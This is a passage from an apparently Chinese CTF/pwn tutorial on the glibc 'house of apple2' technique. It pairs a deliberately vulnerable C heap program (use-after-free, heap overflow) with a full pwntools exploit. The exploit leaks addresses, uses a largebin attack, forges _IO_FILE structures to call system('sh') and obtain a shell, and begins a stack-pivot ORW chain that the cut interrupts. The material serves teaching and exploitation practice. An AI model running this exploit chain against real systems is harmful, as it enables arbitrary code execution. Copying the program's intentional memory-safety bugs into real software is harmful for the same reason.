class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> num 80</span><br><span class="hljs-type">void</span> *chunk_list[num];<br><span class="hljs-type">int</span> chunk_size[num];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span><br>&#123;<br>    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);<br>    setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1.add&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2.edit&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3.show&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4.delete&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;5.exit&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Your choice:&quot;</span>);<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> index,size;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;index:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;index);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Size:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;size);<br>    chunk_list[index] = <span class="hljs-built_in">malloc</span>(size);<br>    chunk_size[index] = size;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">edit</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> size;<br>    <span class="hljs-type">int</span> index;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;index:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;index);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;size:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;size);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;context: &quot;</span>);<br>    read(<span class="hljs-number">0</span>,chunk_list[index],size);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> index;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;index:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;index);<br>    <span class="hljs-built_in">free</span>(chunk_list[index]);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> index;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;index:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;index);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;context: &quot;</span>);<br>    <span class="hljs-built_in">puts</span>(chunk_list[index]);<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> choice;<br>    init();<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>        menu();<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;choice);<br>        <span class="hljs-keyword">if</span>(choice==<span class="hljs-number">5</span>)&#123;<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(choice==<span class="hljs-number">1</span>)&#123;<br>            add();<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(choice==<span class="hljs-number">2</span>)&#123;<br>            delete();<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(choice==<span class="hljs-number">3</span>)&#123;<br>            edit();<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(choice==<span class="hljs-number">4</span>)&#123;<br>            show();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>为了方便调试，存在堆溢出，uaf等漏洞</p><p>我们跟着前面介绍的利用思路，一步一步的走</p><h3 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h3><p>我们首先需要泄露libc地址和heap地址，在有uaf和堆溢出漏洞的前提下，这十分的容易</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">ogs=[<span class="hljs-number">0xebc81</span>,<span class="hljs-number">0xebc85</span>,<span class="hljs-number">0xebc88</span>,<span class="hljs-number">0xebce2</span>]<br>add(<span class="hljs-number">0</span> , <span class="hljs-number">0x440</span>)<br>add(<span class="hljs-number">1</span> , <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">2</span> , <span class="hljs-number">0x430</span>)<br>add(<span class="hljs-number">3</span> , <span class="hljs-number">0x10</span>)<br><br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">4</span> , <span class="hljs-number">0x460</span>)<br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x21b0e0</span><br><br>edit(<span class="hljs-number">0</span> , <span class="hljs-number">0x10</span> , <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x290</span><br>IO_list_all=libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>system_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>_IO_stdfile_2_lock = libc_base + <span class="hljs-number">0x21ca60</span><br><br></code></pre></td></tr></table></figure><p>由于largebin里面同时存在libc地址和heap地址，所以我们直接构造一个largebin出来，来泄露两种地址</p><h3 id="写地址到-IO-list-all"><a href="#写地址到-IO-list-all" class="headerlink" title="写地址到_IO_list_all"></a>写地址到_IO_list_all</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>,p64(libc_base+<span class="hljs-number">0x21b0e0</span>)*<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">2</span>)<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(IO_list_all-<span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">5</span> , <span class="hljs-number">0x470</span>)<br><br>PYTHON<br></code></pre></td></tr></table></figure><p>在我们覆盖chunk0的bk_nextsize指针为 IO_list_all-0x20之后，触发largebin attack的话，就能把chunk2的地址写到IO_list_all-0x20上，从而让chunk2整个堆块变成我们伪造的_IO_FILE结构体</p><p>可以看到这个结构体已经变成了我们的堆块内容</p><h3 id="伪造IO"><a href="#伪造IO" class="headerlink" title="伪造IO"></a>伪造IO</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON">file_addr = heap_base + <span class="hljs-number">0x700</span><br>IO_wide_data_addr = file_addr<br>wide_vtable_addr = file_addr + <span class="hljs-number">0xe8</span> - <span class="hljs-number">0x68</span><br>fake_io = <span class="hljs-string">b&quot;&quot;</span><br>fake_io += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_read_end</span><br>fake_io += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_read_base</span><br>fake_io += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_write_base</span><br>fake_io += p64(<span class="hljs-number">1</span>)  <span class="hljs-comment"># _IO_write_ptr</span><br>fake_io += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_write_end</span><br>fake_io += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_buf_base;</span><br>fake_io += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_buf_end should usually be (_IO_buf_base + 1)</span><br>fake_io += p64(<span class="hljs-number">0</span>)   <span class="hljs-comment"># _IO_save_base </span><br>fake_io += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>   <span class="hljs-comment"># from _IO_backup_base to _markers</span><br>fake_io += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># the FILE chain ptr</span><br>fake_io += p32(<span class="hljs-number">2</span>)  <span class="hljs-comment"># _fileno for stderr is 2</span><br>fake_io += p32(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _flags2, usually 0</span><br>fake_io += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>)  <span class="hljs-comment"># _old_offset, -1</span><br>fake_io += p16(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _cur_column</span><br>fake_io += <span class="hljs-string">b&quot;\x00&quot;</span>  <span class="hljs-comment"># _vtable_offset</span><br>fake_io += <span class="hljs-string">b&quot;\n&quot;</span>  <span class="hljs-comment"># _shortbuf[1]</span><br>fake_io += p32(<span class="hljs-number">0</span>)  <span class="hljs-comment"># padding</span><br>fake_io += p64(_IO_stdfile_2_lock)  <span class="hljs-comment"># _IO_stdfile_2_lock</span><br>fake_io += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>)  <span class="hljs-comment"># _offset, -1</span><br>fake_io += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _codecvt, usually 0</span><br>fake_io += p64(IO_wide_data_addr)  <span class="hljs-comment"># _IO_wide_data_2</span><br>fake_io += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span>  <span class="hljs-comment"># from _freeres_list to __pad5</span><br>fake_io += p32(<span class="hljs-number">0xFFFFFFFF</span>)  <span class="hljs-comment"># _mode, usually -1</span><br>fake_io += <span class="hljs-string">b&quot;\x00&quot;</span> * <span class="hljs-number">19</span>  <span class="hljs-comment"># _unused2</span><br>fake_io = fake_io.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)  <span class="hljs-comment"># adjust to vtable</span><br>fake_io += p64(libc_base+libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>])  <span class="hljs-comment"># _IO_list_all fake vtable</span><br>fake_io += p64(wide_vtable_addr)<br>fake_io += p64(system_addr)<br><br><br></code></pre></td></tr></table></figure><p>伪造IO是house of apple2的难点所在，我们着重分析一下第25行和第30,31,32行的伪造</p><p><strong>fake_io +&#x3D; p64(IO_wide_data_addr) # _IO_wide_data_2</strong></p><p>我们之前提到过，为了方便，我们是将这个堆块同时给伪造成 IO_FILE结构体和 IO_wide_data结构体，而wide_data成员指向的就是 _IO_wide_data结构体的位置，所以我们把它构造到file_addr即可</p><p><strong>fake_io +&#x3D; p64(libc_base+libc.sym[‘_IO_wfile_jumps’]) # _IO_list_all fake vtable</strong></p><p>这个是我们伪造的用于绕过vtable检测的同时调用__doallocate的，不用过多在意，记住即可</p><p><strong>fake_io +&#x3D; p64(wide_vtable_addr)</strong></p><p>这个是我们伪造的 _IO_wide_data结构体的vtable指针，他决定了我们会调用哪里的函数，我们用gdb调试看看</p><p>而他指向的是我们伪造的虚表，这个虚表的类型是 _IO_jump_t，我们来看看伪造的虚表结构</p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250313145104869.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250313145104869.png" alt="image-20250313145104869"></a></p><p>此时我们写入的system正好处于__doallocate的位置，我们来看看他的地址</p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250313145740713.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250313145740713.png" alt="image-20250313145740713"></a></p><p>调用system的时候第一个参数正好是伪造堆的首地址，<code>_flags</code>设置为<code>~(2 | 0x8 | 0x800)</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code> sh;</code>，注意前面有两个空格</p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250313150237585.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250313150237585.png" alt="image-20250313150237585"></a></p><h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwnpy <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><br>filename = <span class="hljs-string">&#x27;./test&#x27;</span><br>url = <span class="hljs-string">&#x27;&#x27;</span><br>gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  b * $rebase(0x0000000000001610)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>set_context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, timeout=<span class="hljs-number">5</span>)<br>p = pr(url = url , filename = filename , gdbscript = gdbscript)<br>elf = ELF(filename)<br>libc = ELF(<span class="hljs-string">&quot;libc.so.6&quot;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">1.add                                                                                                        </span><br><span class="hljs-string">2.edit</span><br><span class="hljs-string">3.show</span><br><span class="hljs-string">4.delete</span><br><span class="hljs-string">5.exit</span><br><span class="hljs-string">Your choice:</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx , size</span>) :<br>  p.sendlineafter(<span class="hljs-string">&quot;Your choice:\n&quot;</span> , <span class="hljs-string">b&#x27;1&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&quot;index:\n&quot;</span> , <span class="hljs-built_in">str</span>(idx))<br>  p.sendlineafter(<span class="hljs-string">&quot;Size:\n&quot;</span> , <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>) :<br>  p.sendlineafter(<span class="hljs-string">&quot;Your choice:\n&quot;</span> , <span class="hljs-string">b&#x27;2&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&quot;index:\n&quot;</span> , <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx , size , content</span>) :<br>  p.sendlineafter(<span class="hljs-string">&quot;Your choice:\n&quot;</span> , <span class="hljs-string">b&#x27;3&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&quot;index:\n&quot;</span> , <span class="hljs-built_in">str</span>(idx))<br>  p.sendlineafter(<span class="hljs-string">&quot;size:\n&quot;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendlineafter(<span class="hljs-string">&quot;context: &quot;</span> , content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>) :<br>  p.sendlineafter(<span class="hljs-string">&quot;Your choice:\n&quot;</span> , <span class="hljs-string">b&#x27;4&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&quot;index:\n&quot;</span> , <span class="hljs-built_in">str</span>(idx))<br><br>ogs=[<span class="hljs-number">0xebc81</span>,<span class="hljs-number">0xebc85</span>,<span class="hljs-number">0xebc88</span>,<span class="hljs-number">0xebce2</span>]<br>add(<span class="hljs-number">0</span> , <span class="hljs-number">0x440</span>)<br>add(<span class="hljs-number">1</span> , <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">2</span> , <span class="hljs-number">0x430</span>)<br>add(<span class="hljs-number">3</span> , <span class="hljs-number">0x10</span>)<br><br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">4</span> , <span class="hljs-number">0x460</span>)<br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x21b0e0</span><br><br>edit(<span class="hljs-number">0</span> , <span class="hljs-number">0x10</span> , <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x290</span><br>IO_list_all=libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>system_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>_IO_stdfile_2_lock = libc_base + <span class="hljs-number">0x21ca60</span><br><br>free(<span class="hljs-number">2</span>)<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(IO_list_all-<span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">5</span> , <span class="hljs-number">0x470</span>)<br><br>file_addr = heap_base + <span class="hljs-number">0x700</span><br>IO_wide_data_addr = file_addr<br>wide_vtable_addr = file_addr + <span class="hljs-number">0xe8</span> - <span class="hljs-number">0x68</span><br>fake_io = <span class="hljs-string">b&quot;&quot;</span><br>fake_io += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_read_end</span><br>fake_io += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_read_base</span><br>fake_io += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_write_base</span><br>fake_io += p64(<span class="hljs-number">1</span>)  <span class="hljs-comment"># _IO_write_ptr</span><br>fake_io += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_write_end</span><br>fake_io += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_buf_base;</span><br>fake_io += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_buf_end should usually be (_IO_buf_base + 1)</span><br>fake_io += p64(<span class="hljs-number">0</span>)   <span class="hljs-comment"># _IO_save_base </span><br>fake_io += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>   <span class="hljs-comment"># from _IO_backup_base to _markers</span><br>fake_io += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># the FILE chain ptr</span><br>fake_io += p32(<span class="hljs-number">2</span>)  <span class="hljs-comment"># _fileno for stderr is 2</span><br>fake_io += p32(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _flags2, usually 0</span><br>fake_io += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>)  <span class="hljs-comment"># _old_offset, -1</span><br>fake_io += p16(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _cur_column</span><br>fake_io += <span class="hljs-string">b&quot;\x00&quot;</span>  <span class="hljs-comment"># _vtable_offset</span><br>fake_io += <span class="hljs-string">b&quot;\n&quot;</span>  <span class="hljs-comment"># _shortbuf[1]</span><br>fake_io += p32(<span class="hljs-number">0</span>)  <span class="hljs-comment"># padding</span><br>fake_io += p64(_IO_stdfile_2_lock)  <span class="hljs-comment"># _IO_stdfile_2_lock</span><br>fake_io += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>)  <span class="hljs-comment"># _offset, -1</span><br>fake_io += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _codecvt, usually 0</span><br>fake_io += p64(IO_wide_data_addr)  <span class="hljs-comment"># _IO_wide_data_2</span><br>fake_io += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span>  <span class="hljs-comment"># from _freeres_list to __pad5</span><br>fake_io += p32(<span class="hljs-number">0xFFFFFFFF</span>)  <span class="hljs-comment"># _mode, usually -1</span><br>fake_io += <span class="hljs-string">b&quot;\x00&quot;</span> * <span class="hljs-number">19</span>  <span class="hljs-comment"># _unused2</span><br>fake_io = fake_io.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)  <span class="hljs-comment"># adjust to vtable</span><br>fake_io += p64(libc_base+libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>])  <span class="hljs-comment"># _IO_list_all fake vtable</span><br>fake_io += p64(wide_vtable_addr)<br>fake_io += p64(system_addr)<br><br><span class="hljs-comment"># pause()</span><br><br>edit(<span class="hljs-number">2</span> , <span class="hljs-number">0x100</span> , fake_io)<br>edit(<span class="hljs-number">1</span> , <span class="hljs-number">0x20</span> , p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + <span class="hljs-string">b&#x27;  sh;&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;Your choice:\n&quot;</span> , <span class="hljs-string">b&#x27;5&#x27;</span>)<br><br><br>lss(<span class="hljs-string">&quot;wide_vtable_addr&quot;</span>)<br>lss(<span class="hljs-string">&quot;libc_base&quot;</span>)<br>lss(<span class="hljs-string">&quot;heap_base&quot;</span>)<br>lss(<span class="hljs-string">&quot;IO_list_all&quot;</span>)<br>lss(<span class="hljs-string">&quot;_IO_stdfile_2_lock&quot;</span>)<br>lss(<span class="hljs-string">&#x27;file_addr&#x27;</span>)<br>p.interactive()<br><br><br><br><br></code></pre></td></tr></table></figure><h2 id="栈迁移打ORW"><a href="#栈迁移打ORW" class="headerlink" title="栈迁移打ORW"></a>栈迁移打ORW</h2><h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><p>主要利用的是<code>svcudp_reply+26</code>这段gadget</p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250405181631716.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250405181631716.png" alt="image-20250405181631716"></a></p><p>控制执行流到这里，此时的rdi就是<code>IO_FILE</code>的首地址，因为我们已经伪造成为可控堆地址，所以我们就可以控制rbp的地址。也就是说我们如果控制call的函数为<code>leave ret</code>也就可以实现栈迁移了。</p><p>实现条件</p><ul><li>IO_FILE的0x48存储ORW的地址</li><li>ORW的0x18处存储<code>leave_ret</code>地址–0x28</li></ul><p>所有我们就可以构造巧妙一点ORW如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON">orw = <span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span><br>orw += p64(pop_rdx_rbx) + p64(<span class="hljs-number">0</span>) + p64(orw_addr + <span class="hljs-number">0x100</span>) + p64(pop_rdi) + p64(orw_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(openn)<br>orw += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(orw_addr + 